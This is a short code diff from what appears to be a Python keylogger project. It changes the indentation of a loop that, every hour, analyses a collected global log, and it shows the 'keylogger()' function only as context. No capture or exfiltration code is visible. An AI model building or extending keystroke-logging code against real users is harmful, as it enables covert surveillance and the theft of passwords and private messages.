@@ -83,9 +83,9 @@ def keylogger():
 		listener.join()
 
 def analyser_every_hour():
-	while True:
-		global log
-		time.sleep(3600)
+    while True:
+        global log
+        time.sleep(3600)
         if (len(log) > 1):
             analyser()
         else:
